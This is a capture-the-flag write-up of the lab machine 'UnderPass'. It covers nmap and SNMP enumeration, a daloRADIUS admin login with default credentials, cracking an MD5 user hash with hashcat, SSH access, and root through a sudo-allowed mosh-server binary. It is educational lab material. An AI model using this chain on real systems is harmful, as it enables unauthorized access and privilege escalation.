## Intro

Tags: #linux #OSCPpath #SNMP #DefaultCreds #known-binary #easy 

------
# Reconnaissance

## Port scan

### Scan specific open TCP ports

```shell
nmap -sC -sV -A $target1
```

```shell
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.9p1 Ubuntu  
80/tcp open http Apache httpd 2.4.52 (Ubuntu)
```

## ### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```

```shell
161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)
```

## SNMP

By enumerating snmp we found very usefull information
```shell
snmpwalk -v2c -c public $target1  
  
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"  
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10  
iso.3.6.1.2.1.1.3.0 = Timeticks: (7695122) 21:22:31.22  
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"  
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"  
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"  
iso.3.6.1.2.1.1.7.0 = INTEGER: 72  
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01  
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1  
<SNIP>
```
possible hints found
```
steve@underpass.htb
UnDerPass.htb is the only daloradius server in the basin!
```

-----
# Foothold

Then i searched only for `daloradius` and read that it is frontend for `FreeRADIUS`

knowing that, navigated to `http://underpass.htb/daloradius`
![](MediaFiles/Pasted%20image%2020261002213512.png)
and got `403` forbidden

then went to the github repo for daloRADIUS and found references to multiple possible login paths by searching the repo
![](MediaFiles/Pasted%20image%2020261002213629.png)

Also with a quick search i found default creds for daloRADIUS
```
administrator
radius
```

## Admin panel login via default creds

And since we have also found possible login paths, tried to login towards:
`http://underpass.htb/daloradius/app/operators/login.php`

![](MediaFiles/Pasted%20image%2020261002213814.png)
Once in , what caught my attention was `Users`
![](MediaFiles/Pasted%20image%2020261002213854.png)
and by clicking that , it listed this account
![](MediaFiles/Pasted%20image%2020261002213909.png)
#### Hash and User obtained
```
svcMosh
412DD4759978ACFCC81DEAB01B382403
```

## Hash cracking

```shell
hashcat -m 0 -a 0 svcmosh.txt /usr/share/wordlists/rockyou.txt
```

```shell
412dd4759978acfcc81deab01b382403:underwaterfriends  
  
Session..........: hashcat  
Status...........: Cracked
```
cracked successfully!
#### creds obtained
```shell
svcMosh
underwaterfriends
```

## Shell as svcMosh

```shell
ssh svcMosh@underpass.htb
```
grabbed user flag!

------
# Privesc

## sudo -l

```shell
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

### Known binary

https://gtfobins.org/gtfobins/mosh-server/#shell
lets run it
```shell
mosh --server=mosh-server localhost /bin/sh
```
but wait, there are env variables
```
MOSH_KEY environment variable not found.
```
hm lets do it from the start, when we run `mosh-server` it starts the server
```shell
sudo mosh-server 

MOSH CONNECT 60001 "this_is_the_MOSH_KEY"

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 5862]
```
It seems the server uses port `60001` as shown above, and we are also given the key , which we are going to use to login

## Shell as root

```bash
MOSH_KEY='this_is_the_MOSH_KEY' mosh-client
```

```shell
root@underpass:~# cat root.txt
```

-------
